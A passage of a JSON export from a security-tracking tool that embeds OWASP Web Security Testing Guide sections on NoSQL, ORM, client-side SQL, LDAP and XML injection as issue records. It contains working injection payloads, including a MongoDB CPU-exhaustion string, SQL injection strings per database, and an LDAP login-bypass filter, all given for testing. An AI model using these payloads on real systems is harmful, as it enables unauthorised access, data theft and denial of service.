prevent attacks against a JSON API, where special characters include \u0060/ { } :\u0060.\nThere are now over 150 [NoSQL databases available](http://nosql-database.org/) for use within an application, providing APIs in a variety of languages and relationship models. Each offers different features and restrictions. Because there is not a common language between them, example injection code will not apply across all NoSQL databases. For this reason, anyone testing for NoSQL injection attacks will need to familiarize themselves with the syntax, data model, and underlying programming language in order to craft specific tests.\nNoSQL injection attacks may execute in different areas of an application than traditional SQL injection. Where SQL injection would execute within the database engine, NoSQL variants may execute during within the application layer or the database layer, depending on the NoSQL API used and data model. Typically NoSQL injection attacks will execute where the attack string is parsed, evaluated, or concatenated into a NoSQL API call.\nAdditional timing attacks may be relevant to the lack of concurrency checks within a NoSQL database. These are not covered under injection testing. At the time of writing MongoDB is the most widely used NoSQL database, and so all examples will feature MongoDB APIs.","TestingInstructions":"### Testing for NoSQL Injection Vulnerabilities in MongoDB\n\nThe MongoDB API expects BSON (Binary JSON) calls, and includes a secure BSON query assembly tool. However, according to MongoDB documentation - unserialized JSON and [JavaScript expressions](https://docs.mongodb.org/manual/faq/developers/#javascript) are permitted in several alternative query parameters. The most commonly used API call allowing arbitrary JavaScript input is the \u0060$where\u0060 operator.\nThe MongoDB \u0060$where\u0060 operator typically is used as a simple filter or check, as it is within SQL.\n\u0060db.myCollection.find( { $where: \u0022this.credits == this.debits\u0022 } );\u0060\nOptionally JavaScript is also evaluated to allow more advanced conditions.\n\u0060db.myCollection.find( { $where: function() { return obj.credits - obj.debits \u003C 0; } } );\u0060\n\n### Example 1\n\nIf an attacker were able to manipulate the data passed into the \u0060$where\u0060 operator, that attacker could include arbitrary JavaScript to be evaluated as part of the MongoDB query. An example vulnerability is exposed in the following code, if user input is passed directly into the MongoDB query without sanitization.\n\u0060db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits \u003C $userInput; } } );;\u0060\nAs with testing other types of injection, one does not need to fully exploit the vulnerability to demonstrate a problem. By injecting special characters relevant to the target API language, and observing the results, a tester can determine if the application correctly sanitized the input. For example within MongoDB, if a string containing any of the following special characters were passed unsanitized, it would trigger a database error.\n\u0060\u0027 \u0022 \\ ; { }\u0060\nWith normal SQL injection, a similar vulnerability would allow an attacker to execute arbitrary SQL commands - exposing or manipulating data at will. However, because JavaScript is a fully featured language, not only does this allow an attacker to manipulate data, but also to run arbitrary code. For example, instead of just causing an error when testing, a full exploit would use the special characters to craft valid JavaScript.\nThis input \u00600;var date=new Date(); do{curDate = new Date();}while(curDate-date\u003C10000)\u0060 inserted into \u0060$userInput\u0060 in the above example code would result in the following JavaScript function being executed. This specific attack string would case the entire MongoDB instance to execute at 100% CPU usage for 10 second.\n\u0060function() { return obj.credits - obj.debits \u003C 0;var date=new Date(); do{curDate = new Date();}while(curDate-date\u003C10000); }\u0060\n\n### Example 2\n\nEven if the input used within queries is completely sanitized or parameterized, there is an alternate path in which one might trigger NoSQL injection. Many NoSQL instances have their own reserved variable names, independent of the application programming language.\nFor example within MongoDB, the \u0060$where\u0060 syntax itself is a reserved query operator. It needs to be passed into the query exactly as shown; any alteration would cause a database error. However, because \u0060$where\u0060 is also a valid PHP variable name, it may be possible for an attacker to insert code into the query by creating a PHP variable named \u0060$where\u0060. The PHP MongoDB documentation explicitly warns developers:\nPlease make sure that for all special query operators (starting with \u0060$\u0060) you use single quotes so that PHP doesn\u2019t try to replace \u0060$exists\u0060 with the value of the variable \u0060$exists\u0060.\nEven if a query depended on no user input, such as the following example, an attacker could exploit MongoDB by replacing the operator with malicious data.\n\u0060db.myCollection.find( { $where: function() { return obj.credits - obj.debits \u003C 0; } } );\u0060\nOne way to potentially assign data to PHP variables is via HTTP Parameter Pollution (see: [Testing for HTTP Parameter pollution](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution)). By creating a variable named \u0060$where\u0060 via parameter pollution, one could trigger a MongoDB error indicating that the query is no longer valid. Any value of \u0060$where\u0060 other than the string \u0060$where\u0060 itself, should suffice to demonstrate vulnerability. An attacker would develop a full exploit by inserting the following:\n\u0060$where: function() { //arbitrary JavaScript here }\u0060","Details":null,"Implication":null,"Recommendation":null,"References":"### Injection Payloads\n\n* [Injection payload wordlist with examples of NoSQL Injection for MongoDB](https://github.com/cr0hn/nosqlinjection_wordlists)\n\n### Whitepapers\n\n* [Bryan Sullivan from Adobe: \u201CNoSQL, But Even Less Security\u201D](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20NoSQL%20But%20Even%20Less%20Security.pdf)\n* [Erlend from Bekk Consulting: Security NOSQL-injection](https://erlend.oftedal.no/blog/?blogid=110)\n* [Felipe Aragon from Syhunt: \u201CNoSQL/SSJS Injection\u201D](http://www.syhunt.com/en/?n=Articles.NoSQLInjection)\n* [MongoDB Documentation: \u201CHow does MongoDB address SQL or Query injection?\u201D](https://docs.mongodb.org/manual/faq/developers/#how-does-mongodb-address-sql-or-query-injection)\n* [PHP Documentation: \u201CMongoDB Driver Classes\u201D](https://www.php.net/manual/en/book.mongodb.php)\n* [Hacking NodeJS and MongoDB](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html)\n* [Attacking NodeJS and MongoDB](https://blog.websecurify.com/2014/08/attacks-nodejs-and-mongodb-part-to.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-05-7 Testing for ORM Injection","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"[Object Relational Mapping (ORM) Injection](https://capec.mitre.org/data/definitions/109.html) is an attack using SQL Injection against an ORM generated data access object model. From the point of view of a tester, this attack is virtually identical to a SQL Injection attack. However, the injection vulnerability exists in code generated by the ORM layer.\nThe benefits of using an ORM tool include quick generation of an object layer to communicate to a relational database, standardize code templates for these objects, and that they usually provide a set of safe functions to protect against SQL Injection attacks. ORM generated objects can use SQL or in some cases, a variant of SQL, to perform CRUD (Create, Read, Update, Delete) operations on a database. It is possible, however, for a web application using ORM generated objects to be vulnerable to SQL Injection attacks if methods can accept unsanitized input parameters.","TestingInstructions":"ORM layers can be prone to vulnerabilities, as they extend the surface of attack. Instead of directly targeting the application with SQL queries, you\u2019d be focusing on abusing the ORM layer to send malicious SQL queries.\n\n### Identify the ORM Layer\n\nTo efficiently test and understand what\u2019s happening between your requests and the backend queries, and as with everything related to conducting proper testing, it is essential to identify the technology being used. By following the [information gathering](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/README) chapter, you should be aware of the technology being used by the application at hand. Check this [list mapping languages to their respective ORMs](https://en.wikipedia.org/wiki/List_of_object-relational_mapping_software).\n\n### Abusing the ORM Layer\n\nAfter identifying the possible ORM being used, it becomes essential to understand how its parser is functioning, and study methods to abuse it, or even maybe if the application is using an old version, identify CVEs pertaining to the library being used. Sometimes, ORM layers are not properly implemented, and thus allow for the tester to conduct normal [SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection), without worrying about the ORM layer.\n\n#### Weak ORM Implementation\n\nA vulnerable scenario where the ORM layer was not implemented properly, taken from [SANS](https://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-hibernate):\n\n\u0060\u0060\u0060\nList results = session.createQuery(\u0022from Orders as orders where orders.id = \u0022 \u002B currentOrder.getId()).list();\nList results = session.createSQLQuery(\u0022Select * from Books where author = \u0022 \u002B book.getAuthor()).list();\n\u0060\u0060\u0060\n\nThe above didn\u2019t implement the positional parameter, which allows the developer to replace the input with a \u0060?\u0060. An example would be as such:\n\n\u0060\u0060\u0060\nQuery hqlQuery = session.createQuery(\u0022from Orders as orders where orders.id = ?\u0022);\nList results = hqlQuery.setString(0, \u0022123-ADB-567-QTWYTFDL\u0022).list(); // 0 is the first position, where it is dynamically replaced by the string set\n\u0060\u0060\u0060\n\nThis implementation leaves the validation and sanitization to be done by the ORM layer, and the only way to bypass it would be by identifying an issue with the ORM layer.\n\n#### Vulnerable ORM Layer\n\nORM layers are code, third-party libraries most of the time. They can be vulnerable just like any other piece of code. One example could be the [sequelize ORM npm library](https://snyk.io/blog/sequelize-orm-npm-library-found-vulnerable-to-sql-injection-attacks/) which was found to be vulnerable in 2019. In another research done by [RIPS Tech](https://www.ripstech.com/), bypasses were identified in the [hibernate ORM used by Java](https://hibernate.org/orm/).\nBased on their [blog article](https://blog.ripstech.com/2020/exploiting-hibernate-injections/), a cheat sheet that could allow the tester to identify issues could be outlined as follows:\n\\| DBMS \\| SQL Injection \\| \\|\u2014\u2014\u2014\u2014\\|\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2013\\| \\| MySQL \\| \u0060abc\\\u0027 INTO OUTFILE --\u0060 \\| \\| PostgreSQL \\| \u0060$$=\u0027$$=chr(61) || chr(0x27) and 1=pg_sleep(2) || version()\u0027\u0060 \\| \\| Oracle \\| \u0060NVL(TO_CHAR(DBMS_XMLGEN.getxml(\u0027select 1 where 1337\u003E1\u0027)),\u00271\u0027)!=\u00271\u0027\u0060 \\| \\| MS SQL \\| \u00601\u003CLEN(%C2%A0(select%C2%A0top%C2%A01%C2%A0name%C2%A0from%C2%A0users)\u0060 \\|\nAnother example would include the [Laravel Query-Builder](https://laravel.com/docs/7.x/queries), which was found to be [vulnerable in 2019](https://freek.dev/1317-an-important-security-release-for-laravel-query-builder).\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":null,"References":"* [Wikipedia - ORM](https://en.wikipedia.org/wiki/Object-relational_mapping)\n* [New Methods for Exploiting ORM Injections in Java Applications (HITB16)](https://insinuator.net/2016/06/new-methods-for-exploiting-orm-injections-in-java-applications-hitb16/)\n* [HITB2016 Slides - ORM Injections in Java Applications](https://archive.conference.hitb.org/hitbsecconf2016ams/sessions/new-methods-for-exploiting-orm-injections-in-java-applications/)\n* [Fixing SQL Injection: ORM is not enough](https://snyk.io/blog/sql-injection-orm-vulnerabilities/)\n* [PayloadsAllTheThings - HQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/HQL%20Injection.md)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-05-8 Testing for Client-side","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Client-side SQL injection occurs when an application implements the [Web SQL Database](https://www.w3.org/TR/webdatabase/) technology and doesn\u2019t properly validate the input nor parametrize its query variables. This database is manipulated by using JavaScript (JS) API calls, such as \u0060openDatabase()\u0060, which creates or opens an existing database.","TestingInstructions":"## Test Objectives\n\nThe following test scenario will validate that proper input validation is conducted. If the implementation is vulnerable, the attacker can read, modify, or delete information stored within the database.\n\n## How to Test\n\n### Identify the Usage of Web SQL DB\n\nIf the tested application implements the Web SQL DB, the following three calls will be used in the client-side core:\n\n* \u0060openDatabase()\u0060\n* \u0060transaction()\u0060\n* \u0060executeSQL()\u0060\n\nThe code below shows an example of the APIs\u2019 implementation:\n\n\u0060\u0060\u0060\nvar db = openDatabase(shortName, version, displayName, maxSize);\n\ndb.transaction(function(transaction) {\n    transaction.executeSql(\u0027INSERT INTO LOGS (time, id, log) VALUES (?, ?, ?)\u0027, [dateTime, id, log]);\n});\n\u0060\u0060\u0060\n\n### Web SQL DB Injection\n\nAfter confirming the usage of \u0060executeSQL()\u0060, the attacker is ready to test and validate the security of its implementation.\nThe Web SQL DB\u2019s implementation is based on [SQLite\u2019s syntax](https://www.sqlite.org/lang.html).\n\n#### Bypassing Conditions\n\nThe following example shows how this could be exploited on the client-side:\n\n\u0060\u0060\u0060\n// URL example: https://example.com/user#15\nvar userId = document.location.hash.substring(1,); // Grabs the ID without the hash -\u003E 15\n\ndb.transaction(function(transaction){\n    transaction.executeSQL(\u0027SELECT * FROM users WHERE user = \u0027 \u002B userId);\n});\n\u0060\u0060\u0060\n\nTo return information for all the users, instead of only the user corresponding to the attacker, the following could be used: \u006015 OR 1=1\u0060 in the URL fragment.\n\n\u003E ***NOTE:*** Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you\u2019re injecting into, it\u2019s common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.\n\nFor additional SQL Injection payloads, go to the [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection) scenario.","Details":null,"Implication":null,"Recommendation":"Follow the same remediation from the [Testing for SQL Injection\u2019s Remediation Section](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#remediation).","References":"* [W3C Web SQL Database](https://www.w3.org/TR/webdatabase/)\n* [Apple\u2019s JavaScript Database Tutorial](https://developer.apple.com/library/archive/documentation/iPhone/Conceptual/SafariJSDatabaseGuide/UsingtheJavascriptDatabase/UsingtheJavascriptDatabase.html)\n* [Tutorialspoint HTML5 Web SQL Database](https://www.tutorialspoint.com/html5/html5_web_sql.htm)\n* [Portswigger\u2019s Client-Side SQL Injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-06 Testing for LDAP Injection","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThe Lightweight Directory Access Protocol (LDAP) is used to store information about users, hosts, and many other objects. [LDAP injection](https://wiki.owasp.org/index.php/LDAP_injection) is a server-side attack, which could allow sensitive information about users and hosts represented in an LDAP structure to be disclosed, modified, or inserted. This is done by manipulating input parameters afterwards passed to internal search, add, and modify functions.\nA web application could use LDAP in order to let users authenticate or search other users\u2019 information inside a corporate structure. The goal of LDAP injection attacks is to inject LDAP search filters metacharacters in a query which will be executed by the application.\n[Rfc2254](https://www.ietf.org/rfc/rfc2254.txt) defines a grammar on how to build a search filter on LDAPv3 and extends [Rfc1960](https://www.ietf.org/rfc/rfc1960.txt) (LDAPv2).\nAn LDAP search filter is constructed in Polish notation, also known as [Polish notation prefix notation](https://en.wikipedia.org/wiki/Polish_notation).\nThis means that a pseudo code condition on a search filter like this:\n\u0060find(\u0022cn=John \u0026 userPassword=mypass\u0022)\u0060\nwill be represented as:\n\u0060find(\u0022(\u0026(cn=John)(userPassword=mypass))\u0022)\u0060\nBoolean conditions and group aggregations on an LDAP search filter could be applied by using the following metacharacters:\n\n| Metachar | Meaning |\n| -------- | ------- |\n| \u0026 | Boolean AND |\n| \\| | Boolean OR |\n| ! | Boolean NOT |\n| = | Equals |\n| \\~= | Approx |\n| \\\u003E= | Greater than |\n| \u003C= | Less than |\n| \\* | Any character |\n| () | Grouping parenthesis |\n\nMore complete examples on how to build a search filter can be found in the related RFC.\nA successful exploitation of an LDAP injection vulnerability could allow the tester to:\n\n* Access unauthorized content\n* Evade application restrictions\n* Gather unauthorized information\n* Add or modify Objects inside LDAP tree structure","TestingInstructions":"## Test Objectives\n\n* Identify LDAP injection points.\n* Assess the severity of the injection.\n\n## How to Test\n\n### Example 1: Search Filters\n\nLet\u2019s suppose we have a web application using a search filter like the following one:\n\u0060searchfilter=\u0022(cn=\u0022\u002Buser\u002B\u0022)\u0022\u0060\nwhich is instantiated by an HTTP request like this:\n\u0060http://www.example.com/ldapsearch?user=John\u0060\nIf the value \u0060John\u0060 is replaced with a \u0060*\u0060, by sending the request:\n\u0060http://www.example.com/ldapsearch?user=*\u0060\nthe filter will look like:\n\u0060searchfilter=\u0022(cn=*)\u0022\u0060\nwhich matches every object with a \u2018cn\u2019 attribute equals to anything.\nIf the application is vulnerable to LDAP injection, it will display some or all of the user\u2019s attributes, depending on the application\u2019s execution flow and the permissions of the LDAP connected user.\nA tester could use a trial-and-error approach, by inserting in the parameter \u0060(\u0060, \u0060|\u0060, \u0060\u0026\u0060, \u0060*\u0060 and the other characters, in order to check the application for errors.\n\n### Example 2: Login\n\nIf a web application uses LDAP to check user credentials during the login process and it is vulnerable to LDAP injection, it is possible to bypass the authentication check by injecting an always true LDAP query (in a similar way to SQL and XPATH injection ).\nLet\u2019s suppose a web application uses a filter to match LDAP user/password pair.\n\u0060searchlogin= \u0022(\u0026(uid=\u0022\u002Buser\u002B\u0022)(userPassword={MD5}\u0022\u002Bbase64(pack(\u0022H*\u0022,md5(pass)))\u002B\u0022))\u0022;\u0060\nBy using the following values:\n\n\u0060\u0060\u0060\nuser=*)(uid=*))(|(uid=*\npass=password\n\u0060\u0060\u0060\n\nthe search filter will results in:\n\u0060searchlogin=\u0022(\u0026(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))\u0022;\u0060\nwhich is correct and always true. This way, the tester will gain logged-in status as the first user in LDAP tree.\n\n## Tools\n\n* [Softerra LDAP Browser](https://www.ldapadministrator.com/)","Details":null,"Implication":null,"Recommendation":null,"References":"* [LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)\n\n\n* [Sacha Faust: LDAP Injection: Are Your Applications Vulnerable?](http://www.networkdls.com/articles/ldapinjection.pdf)\n* [IBM paper: Understanding LDAP](https://www.redbooks.ibm.com/redbooks/pdfs/sg244986.pdf)\n* [RFC 1960: A String Representation of LDAP Search Filters](https://www.ietf.org/rfc/rfc1960.txt)\n* [LDAP injection](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-07 Testing for XML Injection","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nXML Injection testing is when a tester tries to inject an XML doc to the application. If the XML parser fails to contextually validate data, then the test will yield a positive result.\nThis section describes practical examples of XML Injection. First, an XML style communication will be defined and its working principles explained. Then, the discovery method in which we try to insert XML metacharacters. Once the first step is accomplished, the tester will have some information about the XML structure, so it will be possible to try to inject XML data and tags (Tag Injection).","TestingInstructions":"## Test Objectives\n\n* Identify XML injection points.\n* Assess the types of exploits that can be attained and their severities.\n\n## How to Test\n\nLet\u2019s suppose there is a web application using an XML style communication in order to perform user registration. This is done by creating and adding a new \u0060user\u003E\u0060node in an \u0060xmlDb\u0060 file.\nLet\u2019s suppose the xmlDB file is like the following:\n\n\u0060\u0060\u0060\n\u003C?xml version=\u00221.0\u0022 encoding=\u0022ISO-8859-1\u0022?\u003E\n\u003Cusers\u003E\n    \u003Cuser\u003E\n        \u003Cusername\u003Egandalf\u003C/username\u003E\n        \u003Cpassword\u003E!c3\u003C/password\u003E\n        \u003Cuserid\u003E0\u003C/userid\u003E\n        \u003Cmail\u003Egandalf@middleearth.com\u003C/mail\u003E\n    \u003C/user\u003E\n    \u003Cuser\u003E\n        \u003Cusername\u003EStefan0\u003C/username\u003E\n        \u003Cpassword\u003Ew1s3c\u003C/password\u003E\n        \u003Cuserid\u003E500\u003C/userid\u003E\n        \u003Cmail\u003EStefan0@whysec.hmm\u003C/mail\u003E\n    \u003C/user\u003E\n\u003C/users\u003E\n\u0060\u0060\u0060\n\nWhen a user registers himself by filling an HTML form, the application receives the user\u2019s data in a standard request, which, for the sake of simplicity, will be supposed to be sent as a \u0060GET\u0060 request.\nFor example, the following values:\n\n\u0060\u0060\u0060\nUsername: tony\nPassword: Un6R34kb!e\nE-mail: s4tan@hell.com\n\u0060\u0060\u0060\n\nwill produce the request:\n\u0060http://www.example.com/addUser.php?username=tony\u0026password=Un6R34kb!e\u0026email=s4tan@hell.com\u0060\nThe application, then, builds the following node:\n\n\u0060\u0060\u0060\n\u003Cuser\u003E\n    \u003Cusername\u003Etony\u003C/username\u003E\n    \u003Cpassword\u003EUn6R34kb!e\u003C/password\u003E\n    \u003Cuserid\u003E500\u003C/userid\u003E\n    \u003Cmail\u003Es4tan@hell.com\u003C/mail\u003E\n\u003C/user\u003E\n\u0060\u0060\u0060\n\nwhich will be added to the xmlDB:\n\n\u0060\u0060\u0060\n\u003C?xml version=\u00221.0\u0022 encoding=\u0022ISO-8859-1\u0022?\u003E\n\u003Cusers\u003E\n    \u003Cuser\u003E\n        \u003Cusername\u003Egandalf\u003C/username\u003E\n        \u003Cpassword\u003E!c3\u003C/password\u003E\n        \u003Cuserid\u003E0\u003C/userid\u003E\n        \u003Cmail\u003Egandalf@middleearth.com\u003C/mail\u003E\n    \u003C/user\u003E\n    \u003Cuser\u003E\n        \u003Cusername\u003EStefan0\u003C/username\u003E\n        \u003Cpassword\u003Ew1s3c\u003C/password\u003E\n        \u003Cuserid\u003E500\u003C/userid\u003E\n        \u003Cmail\u003EStefan0@whysec.hmm\u003C/mail\u003E\n    \u003C/user\u003E\n    \u003Cuser\u003E\n    \u003Cusername\u003Etony\u003C/username\u003E\n    \u003Cpassword\u003EUn6R34kb!e\u003C/password\u003E\n    \u003Cuserid\u003E500\u003C/userid\u003E\n    \u003Cmail\u003Es4tan@hell.com\u003C/mail\u003E\n    \u003C/user\u003E\n\u003C/users\u003E\n\u0060\u0060\u0060\n\n### Discovery\n\nThe first step in order to test an application for the presence of a XML Injection vulnerability consists of trying to insert XML metacharacters.\nXML metacharacters are:\n\n* Single quote: \u0060\u0027\u0060 \\- When not sanitized\\, this character could throw an exception during XML parsing\\, if the injected value is going to be part of an attribute value in a tag\\.\n\nAs an example, let\u2019s suppose there is the following attribute:\n\u0060\u003Cnode attrib=\u0027$inputValue\u0027/\u003E\u0060\nSo, if:\n\u0060inputValue = foo\u0027\u0060\nis instantiated and then is inserted as the attrib value:\n\u0060\u003Cnode attrib=\u0027foo\u0027\u0027/\u003E\u0060\nthen, the resulting XML document is not well formed.\n\n* Double quote: \u0060\u0022\u0060 \\- this character has the same meaning as single quote and it could be used if the attribute value is enclosed in double quotes\\.\n\n\u0060\u003Cnode attrib=\u0022$inputValue\u0022/\u003E\u0060\nSo if:\n\u0060$inputValue = foo\u0022\u0060\nthe substitution gives:\n\u0060\u003Cnode attrib=\u0022foo\u0022\u0022/\u003E\u0060\nand the resulting XML document is invalid.\n\n* Angular parentheses: \u0060\u003E\u0060 and \u0060\u003C\u0060 \\- By adding an open or closed angular parenthesis in a user input like the following:\n\n\u0060Username = foo\u003C\u0060\nthe application will build a new node:\n\n\u0060\u0060\u0060\n\u003Cuser\u003E\n    \u003Cusername\u003Efoo\u003C\u003C/username\u003E\n    \u003Cpassword\u003EUn6R34kb!e\u003C/password\u003E\n    \u003Cuserid\u003E500\u003C/userid\u003E\n    \u003Cmail\u003Es4tan@hell.com\u003C/mail\u003E\n\u003C/user\u003E\n\u0060\u0060\u0060\n\nbut, because of the presence of the open \u2018\u003C\u2019, the resulting XML document is invalid.\n\n* Comment tag: \u0060\u003C!--/--\u003E\u0060 \\- This sequence of characters is interpreted as the beginning/end of a comment\\. So by injecting one of them in Username parameter:\n\n\u0060Username = foo\u003C!--\u0060\nthe application will build a node like the following:\n\n\u0060\u0060\u0060\n\u003Cuser\u003E\n    \u003Cusername\u003Efoo\u003C!--\u003C/username\u003E\n    \u003Cpassword\u003EUn6R34kb!e\u003C/password\u003E\n    \u003Cuserid\u003E500\u003C/userid\u003E\n    \u003Cmail\u003Es4tan@hell.com\u003C/mail\u003E\n\u003C/user\u003E\n\u0060\u0060\u0060\n\nwhich won\u2019t be a valid XML sequence.\n\n* Ampersand: \u0060\u0026\u0060\\- The ampersand is used in the XML syntax to represent entities\\. The format of an entity is \u0060\u0026symbol;\u0060. An entity is mapped to a character in the Unicode character set.\n\nFor example:\n\u0060\u003Ctagnode\u003E\u0026lt;\u003C/tagnode\u003E\u0060\nis well formed and valid, and represents the \u0060\u003C\u0060 ASCII character.\nIf \u0060\u0026\u0060 is not encoded itself with \u0060\u0026amp;\u0060, it could be used to test XML injection.\nIn fact, if an input like the following is provided:\n\u0060Username = \u0026foo\u0060\na new node will be created:\n\n\u0060\u0060\u0060\n\u003Cuser\u003E\n    \u003Cusername\u003E\u0026foo\u003C/username\u003E\n    \u003Cpassword\u003EUn6R34kb!e\u003C/password\u003E\n    \u003Cuserid\u003E500\u003C/userid\u003E\n    \u003Cmail\u003Es4tan@hell.com\u003C/mail\u003E\n\u003C/user\u003E\n\u0060\u0060\u0060\n\nbut, again, the document is not valid: \u0060\u0026foo\u0060 is not terminated with \u0060;\u0060 and the 